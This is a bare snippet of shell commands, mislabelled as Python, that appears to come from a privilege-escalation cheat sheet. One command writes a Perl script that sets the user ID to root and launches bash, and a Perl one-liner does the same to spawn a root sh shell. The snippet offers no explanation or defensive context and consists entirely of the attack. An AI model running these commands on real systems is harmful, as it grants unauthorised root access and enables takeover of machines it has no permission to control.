
```python
echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > script.pl

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

```
